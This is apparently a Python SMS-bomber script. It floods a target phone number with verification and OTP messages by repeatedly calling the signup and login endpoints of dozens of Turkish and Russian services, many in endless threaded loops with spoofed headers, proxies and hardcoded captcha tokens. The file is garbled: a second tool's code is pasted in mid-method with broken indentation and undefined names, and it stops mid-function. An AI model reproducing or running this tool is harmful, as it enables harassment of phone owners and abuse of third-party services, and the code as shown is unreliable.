import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style

class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"


    # dsmartgo.com.tr
    def Dsmartgo(self):
        dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	"IsSubscriber": "true",
        	"__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	"Mobile": self.phone,
        }, cookies={
        		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		"_ga": "GA1.3.1016548678.1638216163",
        		"_gat": "1",
        		"_gat_gtag_UA_18913632_14": "1",
        		"_gid": "GA1.3.1214889554.1638216163",
        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	})
        try:
            BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dsmartgo.com.tr")
        except AttributeError:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dsmartgo.com.tr")
            self.adet += 1
        def default_headers() -> dict:
    return {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'User-Agent': user_agent()}


def post(link, headers=None, **kwargs):
    if headers == None:
        headers = default_headers()
    try:
        requests.post(link, headers=headers, timeout=5, **kwargs, proxies=proxies())
    except:
        pass


def get(link, headers=None, **kwargs):
    try:
        r = requests.get(link, headers=headers, timeout=5, **kwargs, proxies=proxies())
        return r
    except requests.exceptions.RequestException:
        pass


def put(link, headers=None, **kwargs):
    try:
        requests.put(link, headers=headers, timeout=5, **kwargs, proxies=proxies())
    except requests.exceptions.RequestException:
        pass


def phone_format(phone):
    formatted = [elem for elem in phone if elem.isdigit()]
    phone = ''
    for elem in formatted:
        phone += elem
    if phone[:1] == '8':
        return '7' + phone[1:]
    return phone


def pformat(phone: str, mask: str, mask_symbol: str = "*") -> str:
    formatted_phone: str = ""
    for symbol in mask:
        if symbol == mask_symbol:
            formatted_phone += phone[0]
            phone = phone[(len(phone) - 1) * -1:]
        else:
            formatted_phone += symbol
    return formatted_phone


class Bomber:
    def __init__(self, phone: str) -> None:
        requests.packages.urllib3.disable_warnings()
        self.phone = phone
        name = list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
        self.password = "".join(random.choices(name, k=12))
        self.username = "".join(random.choices(name, k=12))
        self.name = "".join(random.choices(name, k=12))
        self.s = requests.Session()
        self.email = f'{self.name}@gmail.com'
        self.android_headers = {"X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive", "Pragma": "no-cache",
                                "Cache-Control": "no-cache", "Accept-Encoding": "gzip, deflate, br",
                                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36',
                                'DNT': '1'}

    def storeez(self):
        while self.phone in phones_in_spam:
            post('https://12storeez.com/user/send-sms-code-ajax', json={'phone': '+' + self.phone}, headers=default_headers())  # Может использоваться для mail
            sleep(30)

    def privetmir(self):
        while self.phone in phones_in_spam:
            post('https://api-user.privetmir.ru/api/v2/send-code', data={'checkApproves': 'Y', 'approve1': 'on', 'approve2': 'on', 'back_url': '', 'scope': 'register-user reset-password', 'login': pformat(self.phone, '+* (***) ***-**-**')}, headers=default_headers())
            sleep(60)

    def askona(self):
       while self.phone in phones_in_spam:
            get(f'https://www.askona.ru/api/registration/sendcode?csrf_token=c6318d07fe11be1ab54bf01527ceea4f&contact%5Bphone%5D={self.phone}', headers=default_headers())
            sleep(20)

    def pochtabank(self):
        while self.phone in phones_in_spam:
            try:
                session = requests.session()
                session.headers = default_headers()
                session.post('https://my.pochtabank.ru/dbo/registrationService/ib')
                session.put('https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber', json={"confirmation": "send", "phone": pformat(self.phone, '+* (***) ***-**-**')})
            except Exception:
                pass
            sleep(25)

    def xtra(self):
        while self.phone in phones_in_spam:
            for i in range(3):
                post('https://my.xtra.tv/api/signup?lang=uk', data={'phone': '+' + self.phone}, headers=default_headers())
                sleep(30)
            sleep(3600)

    def kazino888(self):
        while self.phone in phones_in_spam:
            for i in range(2):
                post('https://888-ru-api.prod.norway.everymatrix.com/v1/core/registration-tokens', json={'smsDestination': '+' + self.phone}, headers=default_headers())
                sleep(60)
            sleep(3600)

    def srochnodengi(self):
        while self.phone in phones_in_spam:
            for i in range(4):
                post('https://mapi-order.srochnodengi.ru/api/v1/auth/landing/send-sms/', data={'lead': None, 'phone': pformat(self.phone, '+* (***) *** - ** - **')}, headers=default_headers())
                sleep(180)
            sleep(3600)

    def quickresto(self):
        while self.phone in phones_in_spam:
            post('https://quickresto.ru/api_controller/?module=sms&method=sendRegistrationCode', json={'phone': '+' + self.phone}, headers=default_headers())
            sleep(60)

    def n1(self):
        while self.phone in phones_in_spam:
            post('https://tver.n1.ru/service/Users/register', json={"login": self.phone, "password": self.password, "domain": "tver.n1.ru", "type": "owner"})  # Может использоваться для mail
            sleep(300)

    def gloria(self):
        while self.phone in phones_in_spam:
            post('https://www.gloria-jeans.ru/phone-verification/send-code/registration', json={'phoneNumber': '+'+self.phone})
            post('https://www.gloria-jeans.ru/phone-verification/send-code-for-login', json={'phoneNumber': '+'+self.phone})
            sleep(30)

    def weely(self):
        while self.phone in phones_in_spam:
            post('https://api.wheely.com/v6/auth/oauth/token', json={'app_id': "54b5174d2cc1b37a50000001", 'phone': "+" + self.phone}, headers=default_headers())
            sleep(60)

    def ffriend(self):
        while self.phone in phones_in_spam:
            post('https://familyfriend.com/graphql', json={
                "query": "mutation AuthEnterPhoneMutation($input: RequestSignInCodeInput!) {\n  result: requestSignInCode(input: $input) {\n    ... on ErrorPayload {\n      message\n      __typename\n    }\n    ... on RequestSignInCodePayload {\n      codeLength\n      __typename\n    }\n    __typename\n  }\n}\n",
                "operationName": "AuthEnterPhoneMutation", "variables": {"input": {"phone": self.phone}}})
            sleep(60*60*24)

    def olenta(self):
        for i in range(2):
            post('https://online.lenta.com/api.php', data={'tel': pformat(self.phone, '+* (***) ***-**-**')}, headers=default_headers())
            sleep(60)

    def fivepost(self):
        while self.phone in phones_in_spam:
            post('https://api-omni.x5.ru/api/v1/clients-portal/auth/send-sms-code', json={'phoneNumber': '+' + self.phone}, headers={'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Authorization': 'Bearer', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Content-Length': '30', 'Content-Type': 'application/json', 'Host': 'api-omni.x5.ru', 'Origin': 'https://fivepost.ru', 'Pragma': 'no-cache', 'Referer': 'https://fivepost.ru/', 'sec-ch-ua': '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent(), 'X-Portal-Origin': 'https://fivepost.ru'})

    def tinkoff(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" + self.phone}, headers=default_headers())
                sleep(60)
            sleep(3600)

    def lenta(self):
        while self.phone in phones_in_spam:
            for i in range(8):
                post('https://lenta.com/api/v1/registration/requestValidationCode', json={'phone': self.phone}, headers=default_headers())
                sleep(120)
            sleep(3600*13)

    def telegram(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                post('https://my.telegram.org/auth/send_password', data={'phone': '+' + self.phone}, headers=default_headers())
                sleep(20)
            sleep(3600)

    def youla(self):
        while self.phone in phones_in_spam:
            post('https://youla.ru/web-api/auth/request_code', cookies={'tmr_lvid': '977a8377e5cce3f740a399c4a6ebafb0'}, json={'phone': self.phone}, headers={**{'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Cookie': 'tmr_reqNum=69', 'Host': 'youla.ru', 'Pragma': 'no-cache', 'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()}, **{'X-Youla-Json': '{"lvid":"977a8377e5cce3f740a399c4a6ebafb0"}'}})
            sleep(60)

    def mcdonalds(self):
        while self.phone in phones_in_spam:
            post('https://site-api.mcdonalds.ru/api/v1/user/login/phone', json={"number": '+' + self.phone, "g-recaptcha-response": "03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V"})
            sleep(60)

    def sushibox(self):
        while self.phone in phones_in_spam:
            post('https://sbguest.sushibox.org/api/v1/users/webauthorization?api_token=QsWwXIIoVl6F0Zm0cnjRWnvPkEUMqqx66QHBmk3qe0kD7p2RWXzPsgIn2DfN',json={'phone': self.phone})
            sleep(30)

    def pizzaboxru(self):
        while self.phone in phones_in_spam:
            post('https://pizzabox.ru/?action=auth', data={'CSRF': None, 'ACTION': 'REGISTER', 'MODE': 'PHONE', 'PHONE': pformat(self.phone, '+* (***) ***-**-**'), 'PASSWORD': self.password, 'PASSWORD2': self.password})
            sleep(60)

    def rollserv(self):
        for i in range(5):
            post('https://rollserv.ru/user/NewUser/?async=json', data={'type': '2', 'ext[2][1]': 'Иван', 'user[cellphone]': '+' + self.phone, 'user[i_agree]': 'on'}, headers=default_headers())
            sleep(60)
            post('https://rollserv.ru/user/RestorePwd/', data={'login': '+' + self.phone}, headers=default_headers())
            sleep(60)

    def nalog_ru(self):
        while self.phone in phones_in_spam:
            post('https://lkdr.nalog.ru/api/v1/auth/challenge/sms/start', json={'phone': self.phone}, headers=default_headers())
            sleep(120)

    def broniboy(self):
        while self.phone in phones_in_spam:
            try:
                token = Bs(self.s.get('https://broniboy.ru/moscow/').content, 'html.parser').select('meta[name=csrf-token]')[0]['content']
                self.s.post('https://broniboy.ru/ajax/send-sms', data={'phone': pformat(self.phone, '+* (***) ***-**-**'), '_csrf': token}, headers={'X-CSRF-Token': token, 'X-Requested-With': 'XMLHttpRequest'})
            except:
                pass
            sleep(30)

    def anti_sushi(self):
        while self.phone in phones_in_spam:
            try:
                result = str(Bs(self.s.get('https://anti-sushi.ru/', headers=default_headers()).content, 'html.parser').find_all(name='script')[3]).splitlines()[3].split('"')
                result.remove(result[0])
                result.remove(result[1])
                token = result[0]
                self.s.post('https://anti-sushi.ru/?auth', data={'CSRF': '', 'ACTION': 'REGISTER', 'Session': token, 'NAME': 'Иван', 'PHONE': self.phone[1:], 'EMAIL': self.email, 'PASSWORD': self.password, 'PASSWORD2': self.password, 'authactive': ''}, headers=default_headers())
            except:
                pass
            sleep(60)

    def b_apteka(self):
        while self.phone in phones_in_spam:
            try:
                self.s.get('https://b-apteka.ru/lk/login', headers=self.android_headers)
                self.s.post('https://b-apteka.ru/lk/send_confirm_code', json={'phone': self.phone}, cookies=self.s.cookies, headers=self.android_headers)
            except:
                pass
            sleep(60)

    def mtstv(self):
        while self.phone in phones_in_spam:
            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": self.phone}, headers=default_headers())
            sleep(30)

    def citylink(self):
        while self.phone in phones_in_spam:
            for i in range(4):
                post(f'https://www.citilink.ru/registration/confirm/phone/+{self.phone}/', headers=default_headers())
                sleep(60)
            sleep(3600)

    def yandexeda(self):
        while self.phone in phones_in_spam:
            post('https://eda.yandex.ru/api/v1/user/request_authentication_code', json={'phone_number': '+' + self.phone}, headers=default_headers())
            sleep(60)

    def dodopizza(self):
        while self.phone in phones_in_spam:
            post('https://dodopizza.kz/api/sendconfirmationcode', data={'phoneNumber': self.phone}, headers=default_headers())
            sleep(60)

    def yota(self):
        while self.phone in phones_in_spam:
            try:
                post('https://bmp.tv.yota.ru/api/v10/auth/register/msisdn', json={'msisdn': self.phone, 'password': "123456"}, cookies=get('https://tv.yota.ru/').cookies)
            except Exception:
                pass
            sleep(60)

    def modulbank(self):
        while self.phone in phones_in_spam:
            post('https://my.modulbank.ru/api/v2/auth/phone', json={'Cellphone': self.phone[1:]}, headers=default_headers())
            sleep(60)

    def new_tel(self):
        for i in range(2):
            post('https://new-tel.net/ajax/a_api.php', params={'type': 'reg'}, data={'phone_nb': pformat(self.phone, '+* (***) ***-****'), 'phone_number': 'Хочу номер', 'token': '03AGdBq26wF9vypkRRBWWA2uEFxzuYUhrdmyPDZhexuQ1OfK5uC3Taz-57K9Xg3AzTfnqZ8Mh6S0LLB816L-o5fAzH75pq7ukCPCTmypRVtVOF9s3SY-E-KJJtfuPLm5SgovqUQB2XASVHcdb13UEiCmUK5nPeVZ-l3EfxbsPV1ClYcHJVds9p4plFO277bYF1Plsm85g_oeYiw9nJif0ehee7FiPHvqAzmTmjTiSNSrodGQt52qEBkLQt1Y8wfGVq2J-BlWYz4j8OBiy7I_1yXMy-UZLMj4JTtDAqJB8oubTMzxHRVGPgW-bd-y_0QgOaHUYNQ3HWmp0OZcOzLciK_IW7JRI_fRArRWdkVq62bfq-yYhP5dwz4y_EHdg4ZnRusGODw0jEmt9HMWA0EaTXVfanN2sa-oU0NM8ttRdWQmgSPKJtF3sJm0WdjzkHfjquORz82dCctbXz'}, headers={'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'ru,en;q=0.9', 'content-length': '494', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://new-tel.net', 'referer': 'https://new-tel.net/uslugi/call-password/', 'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}, verify=False)
            sleep(30)

    def sunlight(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                post('https://api.sunlight.net/v3/customers/authorization/', json={'phone': self.phone})
                sleep(60)

    def leran(self):
        while self.phone in phones_in_spam:
            post('https://www.leran.pro/user/sendCode/', data={'phone': pformat(self.phone, '+* (***) ***-**-**')})
            sleep(20)

    def uchi(self):
        while self.phone in phones_in_spam:
            post('https://uchi.ru/teens/gateway', json={"operationName": "StudentSignUp_UserSmsLoginRequest", "variables": {"phone": pformat(self.phone, "+* (***) ***-**-**"), "consent": True}, "query": "mutation StudentSignUp_UserSmsLoginRequest($phone: String!, $consent: Boolean) {\n  userSmsLoginRequest(input: {phone: $phone, type: student, consentUseData: $consent}) {\n    payload {\n      success\n      resendTimeout\n      __typename\n    }\n    __typename\n  }\n}\n"}) # Может использоватья для mail bomber
            sleep(30)

    def sro4nodengi(self):
        while self.phone in phones_in_spam:
            post('https://mapi-order.srochnodengi.ru/api/v1/auth/landing/send-sms/', data={'phone': pformat(self.phone, '+* (***) *** - ** - **'), 'lead': None})
            sleep(180)

    def askona(self):
        while self.phone in phones_in_spam:
            get(f'https://www.askona.ru/api/registration/sendcode?csrf_token=fd454c54c651805cbf6fb557fd4cefe0&contact%5Bphone%5D={self.phone}')
            sleep(20)

    def akbars(self):
        while self.phone in phones_in_spam:
            post('https://www.akbars.ru/api/PhoneConfirm/', json={'phoneNumber': self.phone[1:]})
            sleep(300)

    def uchi(self):
        while self.phone in phones_in_spam:
            post('https://uchi.ru/teens/gateway', json={"operationName": "StudentSignUp_UserSmsLoginRequest", "variables": {"phone": pformat(self.phone, "+* (***) ***-**-**"), "consent": True}, "query": "mutation StudentSignUp_UserSmsLoginRequest($phone: String!, $consent: Boolean) {\n  userSmsLoginRequest(input: {phone: $phone, type: student, consentUseData: $consent}) {\n    payload {\n      success\n      resendTimeout\n      __typename\n    }\n    __typename\n  }\n}\n"})
            sleep(30)

    def comfortkino(self):
        while self.phone in phones_in_spam:
            post('https://mgn.comfortkino.ru/local/php_interface/api/v1/user/login/', data={'phone': self.phone[1:]}, headers={'origin': 'https://mgn.comfortkino.ru', 'pragma': 'no-cache', 'referer': 'https://mgn.comfortkino.ru/login/', 'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()})
            sleep(60)

    def noone(self):
        while self.phone in phones_in_spam:
            get(f'https://www.noone.ru/local/templates/noone_adaptive/partials/ajax/sms_check.php?phone=%252B{pformat(self.phone, "*(***)***-**-**")}&sessid=6339fc64b7999d645d74a23f3cdd184a', headers={'pragma': 'no-cache', 'referer': 'https://www.noone.ru/register/', 'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent(), 'x-requested-with': 'XMLHttpRequest'})
            sleep(30)

    def yarus(self):
        while self.phone in phones_in_spam:
            get(f'https://api.yarus.ru/user/exist?phone=%2B{pformat(self.phone, "*(***)%20***-****")}', headers={**{'X-API-KEY': 'PELQTQN2mWfml8XVYsJwaB9Qi4t8XE', 'X-APP': '3', 'X-DEVICE-ID': '4cda50a904e35432a07252cbfad08c37'}, **default_headers()})
            sleep(60)

    def megadisk(self):
        while self.phone in phones_in_spam:
            get(f'https://disk.megafon.ru/api/3/msisdns/{self.phone}', headers={**{'Host': 'disk.megafon.ru', 'Referer': 'https://disk.megafon.ru/sso/confirm'}, **default_headers()})
            post('https://disk.megafon.ru/api/3/md_otp_tokens/', json={'phone': '+' + self.phone}, headers={**{'Host': 'disk.megafon.ru', 'Referer': 'https://disk.megafon.ru/sso/confirm'}, **default_headers()})
            sleep(60)

    def technopark(self):
        while self.phone in phones_in_spam:
             try:
                cookies = get('https://www.technopark.ru/', headers=default_headers()).cookies
                post('https://www.technopark.ru/graphql/', json={"operationName": "AuthStepOne", "variables": {"phone": self.phone[1:], "token": cookies['PHPSESSID'], "cityId": cookies['tp_city_id']}, "query": "mutation AuthStepOne($phone: String!, $token: String!, $cityId: ID!) @access(token: $token) @city(id: $cityId) {\n  sendOTP(phone: $phone)\n}\n"})
             except Exception:
                 pass

    def call(self):
        services = [self.new_tel]
        for function in services:
            Thread(target=function, daemon=False).start()
            sleep(30)

    def rus(self):
        services = [self.technopark, self.megadisk, self.technopark, self.yarus, self.noone, self.comfortkino, self.uchi, self.akbars, self.askona, self.srochnodengi, self.uchi, self.leran, self.sunlight, self.modulbank, self.yota, self.dodopizza, self.yandexeda, self.citylink, self.mtstv, self.b_apteka, self.anti_sushi, self.broniboy, self.nalog_ru, self.rollserv, self.pizzaboxru, self.sushibox, self.mcdonalds, self.youla, self.telegram, self.lenta, self.tinkoff, self.askona, self.olenta, self.ffriend, self.storeez, self.privetmir, self.pochtabank, self.xtra, self.kazino888, self.quickresto, self.n1, self.weely]
        for function in services:
            Thread(target=function, daemon=False).start()
            sleep(1.5)

    # kigili.com
    def Kigili(self):    
        try:
            kigili = requests.post("https://www.kigili.com/users/registration/", data={
                "first_name": "Memati",
                "last_name": "Bas",
                "email": self.mail,
                "phone": f"0{self.phone}",
                "password": "31ABC..abc31",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            })
            if kigili.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com")
        

    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                "mobile_number": self.phone,
                "token_type": "register_token"
            })
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
        

    #naosstars.com
    def NaosStars(self):
        try:
            naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                "email": self.mail,
                "first_name": "Memati",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "date_of_birth": "1975-12-31",
                "phone": f"0{self.phone}",
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            })
            if naosstars.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> shop.naosstars.com")
                self.adet += 1 
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> shop.naosstars.com")
          
        
    #wmf.com.tr
    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
         
    
    #istegelsin.com
    def IsteGelsin(self):
        try:
            json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(self.phone)}}
            r = requests.post("https://prod.fasapi.net:443/",  json=json)
            if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
            
        
    #ceptesok.com
    def Sok(self):
        try:
            r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": self.phone, "token_type": "register_token"})
            if len(r.json()["meta"]["messages"]["success"]) != 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ceptesok.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ceptesok.com")
            
    
    #tiklagelsin.com
    def Tiklagelsin(self):
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": self.phone
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
            
    
    #migros.com.tr
    def Migros(self):
        try:
            migros = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp",  json={"phoneNumber": self.phone})
            if migros.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
            
    
    #a101.com.tr
    def A101(self):
        try:
            url = "https://www.a101.com.tr:443/users/otp-login/"
            data = {"phone": f"0{self.phone}", "next": "/a101-kapida"}
            r = requests.post(url,data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr")
                self.adet += 1
            else:
                raise 
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr")


    #englishhome.com
    def Englishhome(self):
        try:
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
            
            
    #sakasu.com.tr
    def Sakasu(self):
        try:
            data = {"phone": self.phone}
            su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr")
            
    
    #rentiva.com
    def Rentiva(self): 
        try:
            url = "https://rentiva.com:443/api/Account/Login"
